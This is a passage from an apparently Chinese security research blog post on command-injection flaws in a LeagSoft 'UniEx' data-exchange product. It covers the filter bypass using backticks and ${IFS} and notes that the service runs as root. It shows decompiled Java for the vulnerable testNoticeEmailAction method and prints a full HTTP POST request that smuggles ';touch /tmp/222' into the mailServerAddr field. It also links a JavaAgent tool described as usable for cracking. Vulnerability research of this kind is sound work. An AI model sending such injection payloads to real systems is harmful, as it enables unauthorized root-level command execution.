</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/2024-07-29-0d3b7e5111031fac69abbe36548f69d4b03e41557e60107e919f41005f3966d5.png alt=19></p><p>利用````和<code>${IFS}</code>替代空格 在shell中的特点，可以达到任意命令执行的目的，我还发现它的java服务是以root用户启动的，意味着获取这个命令执行的权限就是最高权限。</p><p><img src=https://images.payloads.online/2024-07-29-5a44f4361c4d69a355c43805a908033c99d86f80539148f1fb3898d111b3deae.png alt=20></p><h3 id=后台命令执行二>后台命令执行二</h3><p><code>com.leagsoft.uex.sysparam.controller.NoticeConfigController.class</code> 中的<code>testNoticeEmailAction</code>方法存在命令注入，在调用<code>JavaShellUtil.executeCommand</code>方法时，将用户输入带入了bash脚本后面，但<code>LeagUtil.filterCmdParams</code>对输入的值进行了过滤替换，不过因为参数没有放入单引号中，可以使用<code>;</code> 对前面的脚本进行闭合，从而绕过限制执行任意命令。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>testNoticeEmailAction</span>(HttpServletRequest request, HttpServletResponse response) <span style=color:#66d9ef>throws</span> IOException {
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> emailMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap();
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>[]&gt;</span> map <span style=color:#f92672>=</span> request.<span style=color:#a6e22e>getParameterMap</span>();
</span></span><span style=display:flex><span>        Set<span style=color:#f92672>&lt;</span>Entry<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>[]&gt;&gt;</span> set <span style=color:#f92672>=</span> map.<span style=color:#a6e22e>entrySet</span>();
</span></span><span style=display:flex><span>        Iterator it <span style=color:#f92672>=</span> set.<span style=color:#a6e22e>iterator</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span>(it.<span style=color:#a6e22e>hasNext</span>()) {
</span></span><span style=display:flex><span>            Entry<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>[]&gt;</span> entry <span style=color:#f92672>=</span> (Entry)it.<span style=color:#a6e22e>next</span>();
</span></span><span style=display:flex><span>            emailMap.<span style=color:#a6e22e>put</span>(entry.<span style=color:#a6e22e>getKey</span>(), ((String<span style=color:#f92672>[]</span>)entry.<span style=color:#a6e22e>getValue</span>())<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        String random <span style=color:#f92672>=</span> (String)emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;random&#34;</span>);
</span></span><span style=display:flex><span>        String mailPwd <span style=color:#f92672>=</span> RC4.<span style=color:#a6e22e>RC4DecodeForJS</span>((String)emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;mailSendPwd&#34;</span>), random);
</span></span><span style=display:flex><span>        emailMap.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;mailSendPwd&#34;</span>, mailPwd);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            JavaShellUtil.<span style=color:#a6e22e>executeCommand</span>(<span style=color:#e6db74>&#34;/home/leagsoft/SafeDataExchange/Bin/dataex_iptables.sh &#34;</span> <span style=color:#f92672>+</span> LeagUtil.<span style=color:#a6e22e>filterCmdParams</span>((String)emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;mailServerAddr&#34;</span>)) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; &#34;</span> <span style=color:#f92672>+</span> LeagUtil.<span style=color:#a6e22e>filterCmdParams</span>((String)emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;mailServerPort&#34;</span>)), <span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span>            log.<span style=color:#a6e22e>info</span>(<span style=color:#e6db74>&#34;excute shell command : /home/leagsoft/SafeDataExchange/Bin/dataex_iptables.sh {} {}&#34;</span>, emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;mailServerPort&#34;</span>), emailMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;mailServerPort&#34;</span>));
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span> (IOException var13) {
</span></span><span style=display:flex><span>            log.<span style=color:#a6e22e>error</span>(<span style=color:#e6db74>&#34;excute /home/leagsoft/SafeDataExchange/Bin/dataex_iptables.sh error&#34;</span>, var13);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>.....
</span></span><span style=display:flex><span><span style=color:#75715e>// LeagUtil.filterCmdParams</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>filterCmdParams</span>(String cmdParams) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (StringUtils.<span style=color:#a6e22e>isEmpty</span>(cmdParams)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> cmdParams;
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            String afterParams <span style=color:#f92672>=</span> cmdParams.<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>&#34;`&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>StringUtils.<span style=color:#a6e22e>isEmpty</span>(afterParams) <span style=color:#f92672>&amp;&amp;</span> afterParams.<span style=color:#a6e22e>contains</span>(<span style=color:#e6db74>&#34;$(&#34;</span>)) {
</span></span><span style=display:flex><span>                afterParams <span style=color:#f92672>=</span> afterParams.<span style=color:#a6e22e>replaceAll</span>(<span style=color:#e6db74>&#34;\\$&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            log.<span style=color:#a6e22e>info</span>(<span style=color:#e6db74>&#34;before cmdParams:{},after filter cmdParams:{}&#34;</span>, cmdParams, afterParams);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> afterParams;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></td></tr></table></div></div><p>发送数据包：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>POST <span style=color:#f92672>/</span>UniEx<span style=color:#f92672>/</span>noticeConfig<span style=color:#f92672>/</span>testNoticeEmailAction.<span style=color:#a6e22e>htm</span> HTTP<span style=color:#f92672>/</span>1.<span style=color:#a6e22e>1</span>
</span></span><span style=display:flex><span>Host: 192.<span style=color:#a6e22e>168</span>.<span style=color:#a6e22e>117</span>.<span style=color:#a6e22e>100</span>
</span></span><span style=display:flex><span>Cache<span style=color:#f92672>-</span>Control: max<span style=color:#f92672>-</span>age<span style=color:#f92672>=</span>0
</span></span><span style=display:flex><span>Cookie: JSESSIONID<span style=color:#f92672>=</span>F9DA84D287041E1F8E09234CAA3EAB58;
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua: <span style=color:#e6db74>&#34; Not A;Brand&#34;</span>;v<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;99&#34;</span>, <span style=color:#e6db74>&#34;Chromium&#34;</span>;v<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;96&#34;</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua<span style=color:#f92672>-</span>Mobile: <span style=color:#f92672>?</span>0
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Ch<span style=color:#f92672>-</span>Ua<span style=color:#f92672>-</span>Platform: <span style=color:#e6db74>&#34;macOS&#34;</span>
</span></span><span style=display:flex><span>Upgrade<span style=color:#f92672>-</span>Insecure<span style=color:#f92672>-</span>Requests: 1
</span></span><span style=display:flex><span>Origin: <span style=color:#66d9ef>null</span>
</span></span><span style=display:flex><span>User<span style=color:#f92672>-</span>Agent: Mozilla<span style=color:#f92672>/</span>5.<span style=color:#a6e22e>0</span> (Windows NT 10.<span style=color:#a6e22e>0</span>; Win64; x64) AppleWebKit<span style=color:#f92672>/</span>537.<span style=color:#a6e22e>36</span> (KHTML, like Gecko) Chrome<span style=color:#f92672>/</span>96.<span style=color:#a6e22e>0</span>.<span style=color:#a6e22e>4664</span>.<span style=color:#a6e22e>93</span> Safari<span style=color:#f92672>/</span>537.<span style=color:#a6e22e>36</span>
</span></span><span style=display:flex><span>Referer: https:<span style=color:#75715e>//192.168.117.100/UniEx/login.jsp</span>
</span></span><span style=display:flex><span>Accept: text<span style=color:#f92672>/</span>html,application<span style=color:#f92672>/</span>xhtml<span style=color:#f92672>+</span>xml,application<span style=color:#f92672>/</span>xml;q<span style=color:#f92672>=</span>0.<span style=color:#a6e22e>9</span>,image<span style=color:#f92672>/</span>avif,image<span style=color:#f92672>/</span>webp,image<span style=color:#f92672>/</span>apng,<span style=color:#f92672>*/*</span>;q<span style=color:#f92672>=</span>0.<span style=color:#a6e22e>8</span>,application<span style=color:#f92672>/</span>signed<span style=color:#f92672>-</span>exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.<span style=color:#a6e22e>9</span>
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Site: cross<span style=color:#f92672>-</span>site
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Mode: navigate
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>User: <span style=color:#f92672>?</span>1
</span></span><span style=display:flex><span>Sec<span style=color:#f92672>-</span>Fetch<span style=color:#f92672>-</span>Dest: document
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Language: zh<span style=color:#f92672>-</span>CN,zh;q<span style=color:#f92672>=</span>0.<span style=color:#a6e22e>9</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Type: application<span style=color:#f92672>/</span>x<span style=color:#f92672>-</span>www<span style=color:#f92672>-</span>form<span style=color:#f92672>-</span>urlencoded
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Length: 78
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>random<span style=color:#f92672>=</span>123<span style=color:#f92672>&amp;</span>mailSendPwd<span style=color:#f92672>=</span>123<span style=color:#f92672>&amp;</span>mailServerAddr<span style=color:#f92672>=</span>;touch<span style=color:#f92672>%</span>20<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>222<span style=color:#f92672>&amp;</span>mailServerPort<span style=color:#f92672>=</span>123
</span></span></code></pre></td></tr></table></div></div><h3 id=思考>思考</h3><p>这款产品使用了javassist的动态执行技术，但是java始终还是java，我们只需要hook或者针对它最上层的代码进行研究即可，于是我根据本次漏洞挖掘，编写了一个工具：<a href=https://github.com/Rvn0xsy/DumperAnalyze>Rvn0xsy/DumperAnalyze: 通过JavaAgent与Javassist技术对JVM加载的类对象进行动态插桩，可以做一些破解、加密验证的绕过等操作 (github.com)</a></p><p>通过JavaAgent与Javassist技术对JVM加载的类对象进行动态插桩，可以做一些破解、加密验证的绕过等操作。</p></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents><ol><li><ol><li><a href=#配置网络>配置网络</a></li><li><a href=#源代码解密>源代码解密</a></li><li><a href=#远程调试tomcat>远程调试Tomcat</a></li><li><a href=#后台命令执行一>后台命令执行一</a></li><li><a href=#后台命令执行二>后台命令执行二</a></li><li><a href=#思考>思考</a></li></ol></li></ol></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>